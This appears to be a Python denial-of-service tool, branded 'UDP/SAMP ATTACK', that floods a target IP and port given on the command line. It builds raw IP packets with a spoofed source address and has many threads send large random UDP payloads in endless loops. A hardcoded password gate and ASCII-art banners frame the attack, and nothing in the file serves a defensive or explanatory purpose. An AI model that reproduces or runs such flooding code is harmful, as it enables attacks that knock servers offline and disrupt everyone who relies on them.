import socket
import struct
import codecs
import sys
import threading
import random
import time
import os
ip = sys.argv[1]
port = sys.argv[2]
threads = sys.argv[3]

os.system('cls' if os.name == 'nt' else 'clear')
pasw = "GadaLuBau"

for i in range(3):
    print("\033[36m [PASSWORD]")
    pwd = input("\033[36m [ Masukan Pass :   ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[ Wait ]")
        break
    else:
        time.sleep(1)
        print("[WRONG PASSWORD]")
        continue
time.sleep(1)
print("[SETUP]")
time.sleep(1)

orgip = ip

os.system('cls' if os.name == 'nt' else 'clear')
print ("\033[35m                      ╔════════════════════════════════════╗")
print ("\033[35m                      ║\033[31m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\033[35m  ║")
print ("\033[35m                      ║\033[31m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \033[35m  ║")
print ("\033[35m                      ║\033[31m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \033[35m  ║")
print ("\033[35m                      ╚════════════════════════════════════╝")
print ("\033[31m                   ╔════════════════════╦══════════════════════╗")                 
print ("\033[31m                   ║\033[32m UDP/SAMP ATTACK   \033[31m ║ \033[32m  TOOLS BY ZeysCuy   \033[31m║")
print ("\033[31m                   ╚═══════════════════╦╩╦═════════════════════╝")
print ("\033[31m                  ATTACK TO IP \033[36m%s \033[31m║ ║\033[31m  AND ATTACK TO PORT \033[36m%s"%(ip,port))                                   
            
class MyThread3(threading.Thread):
    def run(self):
        byte = random._urandom(999)
        byte2 = random._urandom(666)
        byte3 = random._urandom(60000)
        try:
            # create a raw socket with IP_HDRINCL option
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except socket.error as e:
            print(f"Socket error: {str(e)}")
            return
        
        # create IP header
        ip_src = '192.168.1.1' # set the source IP address
        ip_dst = ip # set the destination IP address
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_len = 20 + len(byte)
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_chksum = 0 # the kernel will calculate the correct checksum
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                                (ip_ver << 4) + ip_ihl, 
                                ip_tos, 
                                ip_len, 
                                ip_id, 
                                ip_frag_off, 
                                ip_ttl, 
                                ip_proto, 
                                ip_chksum, 
                                socket.inet_aton(ip_src), 
                                socket.inet_aton(ip_dst))
        
        while True:
            try:
                # create UDP header
                udp_src = 12345 # set the source port number
                udp_dst = int(port) # set the destination port number
                udp_len = 8 + len(byte) # UDP header length + payload length
                udp_chksum = 0 # the kernel will calculate the correct checksum
                udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_chksum)
                
                # send the packet
                sock.sendto(ip_header + udp_header + byte, (ip, udp_dst))
                sock.sendto(ip_header + udp_header + byte2, (ip, udp_dst))
                sock.sendto(ip_header + udp_header + byte3, (ip, udp_dst))
            except socket.error as e:
                print(f"Socket error: {str(e)}")
                return
            

if __name__ == '__main__':
    try:
        for x in range(int(threads)):
            th = MyThread3()
            th.start()
            time.sleep(0.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
